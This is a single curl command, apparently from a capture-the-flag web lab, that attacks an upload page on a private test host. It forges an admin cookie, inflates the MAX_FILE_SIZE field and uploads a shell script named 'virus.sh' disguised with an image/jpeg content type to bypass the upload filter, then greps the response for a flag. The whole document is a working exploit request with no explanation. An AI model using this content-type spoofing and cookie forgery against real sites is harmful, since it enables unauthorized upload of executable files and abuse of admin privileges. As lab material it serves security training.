curl 'http://192.168.56.101/index.php?page=upload' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNUdhUK83eR7vVbSJ' \
  -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
  -H 'Origin: http://192.168.56.101' \
  -H 'Referer: http://192.168.56.101/index.php?page=upload' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36' \
  --data-raw $'------WebKitFormBoundaryNUdhUK83eR7vVbSJ\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n1000099999990\r\n------WebKitFormBoundaryNUdhUK83eR7vVbSJ\r\nContent-Disposition: form-data; name="uploaded"; filename="virus.sh"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryNUdhUK83eR7vVbSJ\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n------WebKitFormBoundaryNUdhUK83eR7vVbSJ--\r\n' \
  --insecure | grep flag > flag.txt